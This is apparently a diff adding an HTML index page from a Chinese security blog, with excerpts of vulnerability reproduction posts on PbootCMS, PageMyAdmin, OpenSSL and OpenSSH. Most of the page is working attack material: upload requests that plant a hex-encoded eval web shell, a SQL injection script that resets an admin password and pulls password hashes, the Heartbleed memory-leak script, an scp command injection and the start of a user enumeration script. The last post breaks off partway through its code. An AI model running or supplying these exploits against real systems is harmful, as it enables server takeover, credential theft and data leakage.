@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/55/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-PbootCMS/PbootCMS csrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20csrf/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.899Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PbootCMS-csrf"><a href="#PbootCMS-csrf" class="headerlink" title="PbootCMS csrf"></a>PbootCMS csrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>我将网站建立在本地，本来想测试添加用户的操作，但是发现这里有formcheck验证，所以失败了</p>
+<p><img src="/resource/PbootCMScsrf/media/rId24.png"></p>
+<p>然后我想到了删除用户位置，首先我使用管理员账号登陆，在删除用户的操作时抓包。发现很简单。只有一个id来判断删除哪个用户</p>
+<p><img src="/resource/PbootCMScsrf/media/rId25.png"></p>
+<p>于是我直接构造一个新的url，<a target="_blank" rel="noopener" href="http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004%EF%BC%88%E4%B8%8A%E9%9D%A2%E6%98%AF10003%EF%BC%89">http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004（上面是10003）</a></p>
+<p>确认这个用户是存在的。然后访问<a target="_blank" rel="noopener" href="http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004">http://127.0.0.1/cve/p/admin.php/User/del/ucode/10004</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PbootCMS/PbootCMS%20csrf/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PbootCMS/PbootCMS%20csrf/" data-id="cl5c2qti800d7y8v14pos1a4m" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PageMyAdmin/PageMyAdmin文件上传getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.890Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PageMyAdmin文件上传getshell"><a href="#PageMyAdmin文件上传getshell" class="headerlink" title="PageMyAdmin文件上传getshell"></a>PageMyAdmin文件上传getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先set增加ashx白名单-&gt;</p>
+<pre><code>POST /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
+Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
+Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms
+Host: www.0-sec.org
+Content-Length: 106
+Connection: Keep-Alive
+
+submit=1&amp;swf_upload=2&amp;table=pa_field&amp;field=file_ext=&quot;.jpg,.jpeg,.gif,.bmp,.ashx&quot;  where id=174 and max_num
+</code></pre>
+<p>返回包</p>
+<pre><code>HTTP/1.1 200 OK
+Cache-Control: private
+Content-Length: 72
+Content-Type: text/html; charset=utf-8
+Server: Microsoft-IIS/7.5
+X-AspNet-Version: 2.0.50727
+Date: Sat, 13 Jul 2019 07:52:02 GMT
+
+&lt;script type=&#39;text/javascript&#39;&gt;location.href=&#39;?result=cs_error&#39;&lt;/script&gt;
+</code></pre>
+<p>第二步 在上传ashx-&gt;</p>
+<pre><code>POST /e/aspx/upload.aspx HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
+Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
+Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&amp;from=master
+Host: www.0-sec.org
+Content-Length: 2318
+
+
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;005.ashx&quot;
+Content-Type: image/jpeg
+
+&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;
+using System;
+using System.Web;
+using System.IO;
+
+
+public class Handler : IHttpHandler
+&#123;
+    public bool IsReusable
+    &#123;
+        get
+        &#123;
+            return false;
+        &#125;
+    &#125;
+    public void ProcessRequest(HttpContext context)
+    &#123;
+        byte[] b=&#123;0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E&#125;;
+        try
+        &#123;
+            File.WriteAllBytes(context.Server.MapPath(&quot;/e/upload/s1/article/file/&quot;)+&quot;/file.aspx&quot;,b);
+            context.Response.Write(&quot;oooooooookkkkkkkkk&quot;);
+        &#125;
+        catch(Exception ex)
+        &#123;
+            context.Response.Write(ex.Message);
+        &#125;
+        context.Response.End();
+    &#125;
+&#125;
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;width&quot;
+
+400
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;height&quot;
+
+400
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;url&quot;
+
+
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;filesize&quot;
+
+0
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;username&quot;
+
+admin
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;sid&quot;
+
+1
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;type&quot;
+
+file
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;table&quot;
+
+article
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;field&quot;
+
+titlepic
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;from&quot;
+
+master
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+1
+------WebKitFormBoundaryzBItOAbA8GrZ7s49--
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PageMyAdmin/PageMyAdmin%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/" data-id="cl5c2qtct00d1y8v11gcq7hba" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PageMyAdmin/PageMyAdmin sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.888Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PageMyAdmin-sql注入漏洞"><a href="#PageMyAdmin-sql注入漏洞" class="headerlink" title="PageMyAdmin sql注入漏洞"></a>PageMyAdmin sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+
+import urllib2
+import urllib
+import re
+import sys
+
+def main():
+    url=sys.argv[1]+&quot;/e/aspx/post.aspx&quot;
+    fun=sys.argv[2]
+    if fun==&#39;upass&#39;:
+        update(url)
+    elif fun==&#39;sqlinject&#39;:
+        sqlinject(url)
+    elif fun==&#39;Backstage&#39;:
+        Backstage(url)
+    else:
+        print&#39;&#39;&#39;
+        usage: pageadminsql.py http://www.baidu.com/ upass
+        parameter: uppass sqlinject Backstage
+        &#39;&#39;&#39;
+def update(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&#39;[u][k]pa_member[k][s][k]userpassword=&quot;1527f10a11de5efea4b8516213413c103df55126&quot;[k]where[k]id=2&#39;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;修改密码成功 修改密码：admin_1234213&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;修改密码失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+def sqlinject(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&quot;[u][k]article,pa_member[k][s][k]article.title=pa_member.userpassword[k]where[k]article.id=747&quot;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;密码注入成功 查看密码地址：&#123;0&#125;/index.aspx?lanmuid=63&amp;sublanmuid=654&amp;id=747&lt;&lt;&lt;&lt;&lt;&lt;&quot;.format(sys.argv[1])
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;密码注入失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+def Backstage(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&quot;[u][k]article,pa_log[k][s][k]article.title=pa_log.url[k]where[k]article.id=747&quot;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;后台地址注入成功 查看后台地址：&#123;0&#125;/index.aspx?lanmuid=63&amp;sublanmuid=654&amp;id=747&lt;&lt;&lt;&lt;&lt;&lt;&quot;.format(sys.argv[1])
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;后台地址注入失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+if __name__ == &#39;__main__&#39;:
+    main(
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qtcs00d0y8v10pcd337m" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSSL/（CVE-2014-0160）OpenSSL 心脏出血漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSSL/%EF%BC%88CVE-2014-0160%EF%BC%89OpenSSL%20%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.869Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2014-0160）OpenSSL-心脏出血漏洞"><a href="#（CVE-2014-0160）OpenSSL-心脏出血漏洞" class="headerlink" title="（CVE-2014-0160）OpenSSL 心脏出血漏洞"></a>（CVE-2014-0160）OpenSSL 心脏出血漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenSSL 1.0.2-betaOpenSSL 1.0.1 – OpenSSL 1.0.1f</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><img src="/resource/(CVE-2014-0160)OpenSSL%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/media/rId25.jpg" alt="15896120731.jpg"></p>
+<pre><code>#!/usr/bin/python
+
+# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# The author disclaims copyright to this source code.
+
+import sys
+import struct
+import socket
+import time
+import select
+import re
+from optparse import OptionParser
+
+options = OptionParser(usage=&#39;%prog server [options]&#39;, description=&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;)
+options.add_option(&#39;-p&#39;, &#39;--port&#39;, type=&#39;int&#39;, default=443, help=&#39;TCP port to test (default: 443)&#39;)
+
+def h2bin(x):
+    return x.replace(&#39; &#39;, &#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;hex&#39;)
+
+hello = h2bin(&#39;&#39;&#39;
+16 03 02 00  dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01                                  
+&#39;&#39;&#39;)
+
+hb = h2bin(&#39;&#39;&#39; 
+18 03 02 00 03
+01 40 00
+&#39;&#39;&#39;)
+
+def hexdump(s):
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        hxdat = &#39; &#39;.join(&#39;%02X&#39; % ord(c) for c in lin)
+        pdat = &#39;&#39;.join((c if 32 &lt;= ord(c) &lt;= 126 else &#39;.&#39; )for c in lin)
+        print &#39;  %04x: %-48s %s&#39; % (b, hxdat, pdat)
+    print
+
+def recvall(s, length, timeout=5):
+    endtime = time.time() + timeout
+    rdata = &#39;&#39;
+    remain = length
+    while remain &gt; 0:
+        rtime = endtime - time.time() 
+        if rtime &lt; 0:
+            return None
+        r, w, e = select.select([s], [], [], 5)
+        if s in r:
+            data = s.recv(remain)
+            # EOF?
+            if not data:
+                return None
+            rdata += data
+            remain -= len(data)
+    return rdata
+        
+
+def recvmsg(s):
+    hdr = recvall(s, 5)
+    if hdr is None:
+        print &#39;Unexpected EOF receiving record header - server closed connection&#39;
+        return None, None, None
+    typ, ver, ln = struct.unpack(&#39;&gt;BHH&#39;, hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+        print &#39;Unexpected EOF receiving record payload - server closed connection&#39;
+        return None, None, None
+    print &#39; ... received message: type = %d, ver = %04x, length = %d&#39; % (typ, ver, len(pay))
+    return typ, ver, pay
+
+def hit_hb(s):
+    s.send(hb)
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print &#39;No heartbeat response received, server likely not vulnerable&#39;
+            return False
+
+        if typ == 24:
+            print &#39;Received heartbeat response:&#39;
+            hexdump(pay)
+            if len(pay) &gt; 3:
+                print &#39;WARNING: server returned more data than it should - server is vulnerable!&#39;
+            else:
+                print &#39;Server processed malformed heartbeat, but did not return any extra data.&#39;
+            return True
+
+        if typ == 21:
+            print &#39;Received alert:&#39;
+            hexdump(pay)
+            print &#39;Server returned error, likely not vulnerable&#39;
+            return False
+
+def main():
+    opts, args = options.parse_args()
+    if len(args) &lt; 1:
+        options.print_help()
+        return
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print &#39;Connecting...&#39;
+    sys.stdout.flush()
+    s.connect((args[0], opts.port))
+    print &#39;Sending Client Hello...&#39;
+    sys.stdout.flush()
+    s.send(hello)
+    print &#39;Waiting for Server Hello...&#39;
+    sys.stdout.flush()
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ == None:
+            print &#39;Server closed connection without sending Server Hello.&#39;
+            return
+        # Look for server hello done message.
+        if typ == 22 and ord(pay[0]) == 0x0E:
+            break
+
+    print &#39;Sending heartbeat request...&#39;
+    sys.stdout.flush()
+    s.send(hb)
+    hit_hb(s)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSSL/%EF%BC%88CVE-2014-0160%EF%BC%89OpenSSL%20%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSSL/%EF%BC%88CVE-2014-0160%EF%BC%89OpenSSL%20%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qti700d5y8v1esujbbhs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSSH/（CVE-2020-15778）OpenSSH 命令注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.792Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-15778）OpenSSH-命令注入漏洞"><a href="#（CVE-2020-15778）OpenSSH-命令注入漏洞" class="headerlink" title="（CVE-2020-15778）OpenSSH 命令注入漏洞"></a>（CVE-2020-15778）OpenSSH 命令注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><strong>实际环境中的利用方案以及场景：</strong>对于用户来说，ssh被阻止，但authorized_keys文件中的命令选项允许使用scp的情况。您可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到了ssh的用户密码，但是不允许ssh连接，或者ip等各种限制，可以尝试此漏洞进行利用。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenSSH &lt;=8.3p1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>scp 1.txt root@ip:&#39;`touch /root/test2.txt`/root/12111.txt&#39;
+</code></pre>
+<p><img src="/resource/(CVE-2020-15778)OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="11.png"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSSH/%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qth000d3y8v19h4y8tvz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSSH/（CVE-2018-15473）OpenSSH 用户枚举漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.790Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-15473）OpenSSH-用户枚举漏洞"><a href="#（CVE-2018-15473）OpenSSH-用户枚举漏洞" class="headerlink" title="（CVE-2018-15473）OpenSSH 用户枚举漏洞"></a>（CVE-2018-15473）OpenSSH 用户枚举漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH<br>7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件敏感信息。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenSSH &lt; 7.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞存在于OpenSSH所实现的一些认证功能之中，首先我们一起看一看Ubuntu<br>OpenSSH的公共密钥认证漏洞。</p>
+<p>通过向一台OpenSSH服务器发送恶意的公共密钥认证消息，攻击者将能够获取特定的用户名信息。如果用户不存在，服务器将会向客户端发送认证失败的消息。如果用户存在，消息将无法解析并终止通信，即通信连接会在没有任何消息回传的情况下断开。关于该漏洞的漏洞利用代码可以从这个Python<br>PoC脚本中获取：</p>
+<blockquote>
+<p>pip2 install --upgrade paramiko==2.4.1</p>
+<p>pip2 install paramiko</p>
+</blockquote>
+<pre><code>#!/usr/bin/env python
+
+# Copyright (c) 2018 Matthew Daley
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the &quot;Software&quot;), to
+# deal in the Software without restriction, including without limitation the
+# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+# sell copies of the Software, and to permit persons to whom the Software is
